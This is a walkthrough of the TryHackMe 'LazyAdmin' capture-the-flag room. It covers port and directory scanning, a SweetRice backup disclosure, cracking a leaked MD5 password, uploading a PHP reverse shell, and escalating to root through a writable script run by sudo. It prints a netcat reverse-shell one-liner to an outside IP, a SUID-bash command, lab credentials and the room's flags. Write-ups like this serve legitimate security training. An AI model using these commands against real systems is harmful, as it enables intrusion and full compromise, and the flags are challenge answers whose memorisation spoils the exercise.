---
created: 01-02-2026
---
- Challenge: [`LazyAdmin`](https://tryhackme.com/room/lazyadmin)

## Recon

- Port scanning:

```bash
 sudo nmap 10.67.145.115
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 16:34 UTC
Nmap scan report for 10.67.145.115
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.57 seconds
```

- That's what we see at `http://10.67.145.115:80`:

![[apache.png]]

- Enumerating files and directories:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.67.145.115:80/FUZZ -e html,txt -ic -c -s
```

```bash
content

```

- At `/content`:

![[content.png]]

- Let's run `ffuf` for the `/content` directory as well:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.67.145.115:80/content/FUZZ -e html,txt -ic -c -s
```

```bash
images
js
inc
as
_themes
attachment
```

- In the documentation, we find that webmaster dashboard is usually located at `/as`. And here we find it:

```bash
http://10.67.145.115/content/as/
```

![[sweetrice.png]]


- Searching for CVEs, we find a [Backup Disclosure](https://www.exploit-db.com/exploits/40718) vulnerability was found for versions `1.5.1`:

```bash
```txt
Title: SweetRice 1.5.1 - Backup Disclosure
Application: SweetRice
Versions Affected: 1.5.1
Vendor URL: http://www.basic-cms.org/
Software URL: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
Discovered by: Ashiyane Digital Security Team
Tested on: Windows 10
Bugs: Backup Disclosure
Date: 16-Sept-2016


Proof of Concept :

You can access to all mysql backup and download them from this directory.
http://localhost/inc/mysql_backup

and can access to website files backup from:
http://localhost/SweetRice-transfer.zip
```

- See that `inc`? Something `ffuf` has found as well.

![[inc.png]]

Directory listing!

- We find an `.sql` file at `http://10.67.145.115/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql`:

```bash
wget http://10.67.145.115/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
```

`.sql` files are text files, so we can read it with `cat`:

```bash
cat mysql_bakup_20191129023059-1.5.1.sql
```

In the bunch of text we find this:

```bash
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;',
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
```

Do you see it? A hash (and also a username, `manager`)! Certainly MD5 (32 characters): 

```bash
42f749ade7f9e195bf475f37a44cafcb
```

[CrackStation](https://crackstation.net/) reveals this is `Password123`:

![[crackstation.png]]

`manager`:`Password123` should open the admin dashboard for us. 

![[sweetrice_as.png]]

To open the website, click `Running`.

Navigating to `content/` again, we see:

![[open.png]]

It turns out that you can upload arbitrary files via the `Ads` tab. Paste the content of [this PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) (but change your IP address and port):

```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
```

![[ads.png]]

- Set up a listener:

```bash
rlwrap nc -lvnp 1337
```

- Then activate the shell by navigating:

```bash
http://10.67.167.9/content/inc/ads/shellphp.php
```

![[listing.png]]

- And we got the shell!

```bash
rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.148.230] from (UNKNOWN) [10.67.167.9] 49936
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 16:39:38 up 25 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

## Privilege escalation

- During enumeration, we find that the `/home/itguy` directory is world-readable, and there's a world-readable `user.txt` flag:

```bash
cat /home/itguy/user.txt
```

```bash
THM{63e5bce9271952aad1113b6f1ac28a07}
```

So we got the first flag!

In `/home/itguy` we find several more interesting files:

- MySQL credentials:

```bash
cat mysql_login.txt
```

```bash
rice:randompass
```

- And `backup.pl` that is owned by root (what on earth does it do here):

```bash
ls -la backup.pl
```

```bash
-rw-r--r-x  1 root  root    47 Nov 29  2019 backup.pl
```

```bash
cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

- Inspecting that `/etc/copy.sh`:

```bash
ls -l /etc/copy.sh
```
```bash
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

```bash
cat /etc/copy.sh
```
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

A reverse shell? Okay. Something is off with this `backup.pl`. 

Further enumeration reveals we can run this `backup.pl` as any user with `sudo`:

```bash
sudo -l
```

```bash
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

- So, we do this:

```bash
echo 'chmod +s /bin/bash' > /etc/copy.sh
```

- Then:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

- Checking `/bin/bash` permissions:

```bash
ls -l /bin/bash
```
```bash
-rwsr-sr-x 1 root root 1109564 Jul 12  2019 /bin/bash
```

- Get the root shell:

```bash
/bin/bash -p
```

```bash
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

- Get the root flag!

```bash
cat /root/root.txt
```

```bash
THM{6637f41d0177b6f37cb20d775124699f}
```
